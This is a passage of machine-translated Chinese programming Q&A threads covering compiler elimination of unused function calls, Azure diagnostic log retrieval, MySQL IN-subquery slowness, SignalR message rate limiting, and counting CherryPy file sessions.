测试从未被阅读过的地方。没有。然后

```
test = score_squareNEON(patch, image, current_pos);
test = 0;
other_used_variable += test;
used_value = score_squareC(patch, image, current_pos); 
```

依然没有。最终使它执行这两个功能的是

```
value = score_squareNEON(patch, image, current_pos);
test = score_squareC(patch, image, current_pos);
...
min = (value+test)/2; //before it was min=value; 
```

也非常重要。这两个函数都定义在我调用它们的同一个文件中。当我尝试将函数声明移动到不同的文件时，在每个示例中都会调用它们。

首先，我对编译器非常尊重。其次，我到底要做什么来确保调用一个函数？这让我开始质疑我之前计时的所有事情。如果在正常模式下

```
timerStart();
functionCall();
timerEnd(); 
```

中间的功能完全优化了吗？我是否需要每次都以某种方式开始检查，还是有什么技巧可以使用？编译器何时可以优化整个函数调用的规则是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T18:00:53.130

> 也非常重要。这两个函数都定义在我调用它们的同一个文件中。当我尝试将函数声明移动到不同的文件时，在每个示例中都会调用它们。

当编译器可以证明一个函数调用没有副作用，并且它的结果没有被使用时，它可以移除这个调用。如果不能证明这一点，则无法删除该调用，因为据编译器所知，该函数可能具有副作用，并且不能消除这些副作用。

声明将函数调用的结果分配给的变量¹应该足以强制编译器将函数调用留在程序中（6.7.3，N1570 中的第 7 段）：

> 具有 volatile 限定类型的对象可能会以实现未知的方式进行修改或具有其他未知的副作用。因此，任何引用此类对象的表达式都应严格按照抽象机的规则进行评估，如 5.1.2.3 中所述。此外，在每个序列点，最后存储在对象中的值应与抽象机规定的值一致，除非由前面提到的未知因素修改。构成对具有 volatile 限定类型的对象的访问是由实现定义的。

据我所知，对于 C++，保证不那么明确，但我认为 1.9 应该优先：

程序执行，1.9（6）和（7）：

> 抽象机器的可观察行为是它对易失性数据的读取和写入顺序以及对库 I/O 函数的调用。6)
> 
> 访问由 volatile 左值 (3.10) 指定的对象、修改对象、调用库 I/O 函数或调用执行任何这些操作的函数都是副作用，它们是执行环境状态的变化。表达式的评估可能会产生副作用。在被称为序列点的执行序列中的某些指定点，之前评估的所有副作用都应该是完整的，并且后续评估的副作用应该没有发生。

在 7.1.5.1 中：

> [注意： volatile 是对实现的提示，以避免涉及对象的激进优化，因为对象的值可能会通过实现无法检测到的方式进行更改。详细语义见 1.9。一般来说，volatile 的语义在 C++ 中与在 C 中的语义相同。]

¹ 当然，这不适用于`void fun()`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T18:01:01.167

编译器可以对您的代码做任何它想做的事情，只要“可观察”的结果与您在该语言定义的理想化“虚拟机”上编写的代码完全一样，无法区分。

“可观察”不包括运行时间、分析器结果、通过调试器观察到的变量等。可观察行为被认为是对易失性对象的访问、写入文件的数据以及对输入和输出设备的处理。

因此，要确保您的代码实际运行，您需要确保它必须运行才能产生正确的可观察行为。通常，您可以只保存要打印或写入文件的输出（在您计时的代码之外）。另一种选择是将输出写入 volatile 变量。

另一件事可能很重要，如果编译器可以静态评估您的代码，那么即使您打印输出，函数调用也可能减少为仅加载编译器的静态计算输出。为避免这种情况，您可能必须向函数提供无法静态知道的输入，例如从输入或文件或易失性变量中读取的数据。

* * *

当然，以您不会在实际程序中使用的方式使用输入和输出会影响时序。因此，衡量性能最可靠的方法是在具有您希望测试的配置的真实程序中进行。编写程序以便在配置之间轻松切换，然后测试两者。

# azure - 检索 Azure 诊断日志

> ID：11782974
> 
> 赞同：0
> 
> 时间：2012-08-02T17:46:25.387
> 
> 标签：azure, azure-diagnostics

我们在 Azure 中运行的 5 个部署中有大约 10 个实例，并记录到 Azure 诊断 (WADLogsTable)。我需要在几分钟内检索一次这些日志，以便由 3rd 方工具在本地进行分析。我已经有一个简单的版本，它从表中读取日志，保存最后一个分区和行键，下次运行查询 PartitionKey >= SavedPartitionKey。问题在于，并非以这种方式检索所有日志：WAD 使用日志缓冲并在 5 分钟内将日志批量存储在表中（每个实例）。记录事件的 RowKey 以部署 ID（即 guid）开头。

1.  在时间 00:05:30 InstanceA 与 DeploymentId=999... 放置最近 5 分钟的日志 PK RK 消息 00:01:00 999 msg1 00:01:00 999 msg2 00:02:00 999 msg3 00:02： 00 999 味精4 00:05:00 999 味精5
2.  在 00:06:00 开始传输脚本，获取所有日志，保存 LastPK=00:05:00
3.  在时间 00:06:30 InstanceB 与 DeploymentId=111... 放置最后 5 分钟的日志 00:02:00 111 msg6 00:03:00 111 msg7 00:05:00 111 msg8 00:06:00 111 msg9
4.  在 00:07:00 开始传输脚本，获取 PK>=LastPK=00:05:00 的日志，实际上只检索 msg8 和 msg9（丢失 msg6 和 msg7）。

我想到的解决方案是每次 TransferScript 检索最后 6 分钟的所有日志（5 分钟用于 wad 同步 + 1 分钟用于缓冲区），但这会大大增加传输的数据量（如 5 次）+ 需要以某种方式过滤出已经检索到的日志，这可能是有问题的。另外我考虑过添加 Timestamp>LastSeenTimestamp 但我不确定它是否解决了数据量和重复的问题，以及这样我是否不会丢失消息。有任何想法吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T04:42:14.220

另一种可能性是在您的查询中包含“DeploymentId”以及“PartitionKey”以获取最后“n”分钟的诊断数据（如果您有此信息可用）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T18:25:06.927

传输到第三方工具是否需要实时或“尽快”？您只能传输 5 分钟或更早的数据而不传输小于 5 分钟的数据吗？这将确保您只会传输已完成的分区。

# mysql - MySQL 会自动优化子查询吗？

> ID：11782979
> 
> 赞同：10
> 
> 时间：2012-08-02T17:46:39.647
> 
> 标签：mysql, sql

我想运行以下查询：

```
-- Main Query    
SELECT COUNT(*) FROM table_name WHERE device_id IN 
     (SELECT DISTINCT device_id FROM table_name WHERE NAME = 'SOME_PARA') 
```

以下查询（来自主查询的子查询）：

```
SELECT DISTINCT device_id FROM table_name WHERE NAME = 'SOME_PARA' 
```

在 7 秒内执行，从 2.1M 行的表中提供 2691 行。

我触发了上面的**主查询**，等待 5 分钟后它仍在执行。

最后，我单独执行了子查询，从结果中取出2691条记录，执行如下查询：

```
-- Main Query (improvised)    
SELECT COUNT(*) FROM table_name WHERE device_id IN 
     ("device_id_1", "device_id_2", ....., "device_id_2691") 
```

令人惊讶的是，这在 40 秒内给了我答案。

是什么赋予了？为什么 MySQL 不使用我使用的相同技术并快速给出答案？难道我做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-02T18:26:44.480

不幸的是，MySQL 不太擅长使用 IN 优化子查询。这是来自[MySQL 文档](http://dev.mysql.com/doc/refman/5.5/en/subquery-restrictions.html)：

> IN 的子查询优化不如 = 运算符或 IN(value_list) 运算符有效。
> 
> IN 子查询性能不佳的典型情况是子查询返回少量行但外部查询返回大量行以与子查询结果进行比较。
> 
> 问题在于，对于使用 IN 子查询的语句，优化器将其重写为相关子查询。考虑以下使用不相关子查询的语句：
> 
> SELECT ... FROM t1 WHERE t1.a IN (SELECT b FROM t2);
> 
> 优化器将语句重写为相关子查询：
> 
> SELECT ... FROM t1 WHERE EXISTS (SELECT 1 FROM t2 WHERE t2.b = t1.a);
> 
> 如果内部和外部查询分别返回 M 和 N 行，则执行时间变为 O(M×N) 的数量级，而不是 O(M+N)，因为它对于不相关的子查询。
> 
> 这意味着 IN 子查询可能比使用 IN(value_list) 运算符编写的查询慢得多，该运算符列出了子查询将返回的相同值。

尝试使用 JOIN 代替。

因为 MySQL 是由内向外工作的，所以有时你可以通过将子查询包装在另一个子查询中来欺骗 MySQL，如下所示：

```
SELECT COUNT(*) FROM table_name WHERE device_id IN
     (SELECT * FROM (SELECT DISTINCT device_id FROM table_name WHERE NAME = 'SOME_PARA') tmp) 
```

这是 JOIN 解决方案：

```
SELECT COUNT(DISTINCT t2.id) FROM table_name t1
  JOIN table_name t2
    ON t2.device_id = t1.device_id
  WHERE t1.NAME = 'SOME_PARA' 
```

请注意，我从内部开始，也走出去。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T18:02:32.353

编辑：我不知道在这种情况下 MySQL 愚蠢的原因是什么 :)，[这个错误报告](http://bugs.mysql.com/bug.php?id=9021)似乎与案例有关。解决方法是使用 JOIN

```
SELECT 
    COUNT(t1.device_id) 
FROM table_name t1 
JOIN (
    SELECT DISTINCT device_id FROM table_name WHERE NAME = 'SOME_PARA'
) as t2 ON t2.device_id = t1.device_id 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T18:43:26.077

我认为您可以将查询重写为：

```
 SELECT sum(NumOnDevice) 
 from (SELECT device_id, count(*) as NumOnDevice
       FROM table_name
       having sum(case when NAME = 'SOME_PARA' then 1 else 0 end) > 0
      ) t 
```

我意识到这并不能回答您的问题，但它可能会对您有所帮助。

在优化方面，给查询提供一堆常量和给查询提供子查询（即使结果相同）之间存在天壤之别。在第一种情况下，查询优化器有更多的信息来决定查询计划。第二，信息在编译时不可用。

Mysql - 比大多数数据库更多 - 似乎根据查询的表达方式生成查询计划。SQL 被设计为一种声明性语言，而不是一种过程语言。这意味着 SQL 查询描述了所需的结果集，并且查询引擎应该决定实现该结果的最佳方法。但是，在许多情况下，必须帮助数据库引擎才能获得最佳结果。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-02T17:58:45.593

看看你要求 MySQL 做什么，它必须查看 table_name 中的每条记录，确定 device_id 是否在它通过运行查询获得的列表中，然后决定是否将其添加到计数中。所以它运行了 210 万次子查询。

这也是为什么当手动定义该列表时，它可以很快地浏览它。

# c# - 限制用户调用集线器方法

> ID：11782982
> 
> 赞同：1
> 
> 时间：2012-08-02T17:46:44.637
> 
> 标签：c#, asp.net, signalr

如果我正在使用 SignalR 开发聊天应用程序，并且有没有办法限制在特定时间允许发送的聊天消息数量，这样用户就不能发送垃圾邮件。它不需要是一个超级复杂的系统，只需要限制每分钟大概 60-100 条消息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T18:15:40.163

SignalR 没有任何内在的帮助，您必须在今天的 Hub 方法实现中跟踪并限制自己的速率。将来您可能希望将其实现为一种“过滤器”（如 ASP.NET MVC 动作过滤器），但 SignalR 中的过滤器规范现在才刚刚开始充实。如果您有兴趣，可以[在 GitHub 上](https://github.com/SignalR/SignalR/issues/548)阅读并参与此讨论。

# session - 如何确定当前的 CherryPy 会话数？

> ID：11782998
> 
> 赞同：1
> 
> 时间：2012-08-02T17:47:33.937
> 
> 标签：session, cherrypy

我找到了旧版 CherryPy 的代码：

```
len(cherrypy.session.cache) 
```

[http://tools.cherrypy.org/wiki/ActiveSessionCount](http://tools.cherrypy.org/wiki/ActiveSessionCount)

但这在 CherryPy 3.2.2 中不再有效。

错误 => AttributeError：“FileSession”对象没有“缓存”属性

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-10T18:47:49.547

好的，因为我将会话数据存储在文件系统中，所以我需要以不同的方式获取会话数。基本上，每个用户都会根据我的配置设置在我的应用程序的会话文件夹中创建一个文件......

```
tools.sessions.on = True
tools.sessions.storage_type = 'file'
tools.sessions.storage_path = 'sessions' 
```

所以我只需要计算会话文件夹中的文件数。我通过以下代码行完成此操作：

```
NumberOfSessions=len([FileName for FileName in os.listdir(os.path.abspath(os.path.dirname('sessions')) + '/sessions') if not '.lock' in FileName and os.path.isfile(os.path.abspath(os.path.dirname('sessions')) + '/sessions/' + FileName)]) 
```

[此代码不包括具有 *.lock 扩展名的文件，否则会话可能会被计算两次]

安德鲁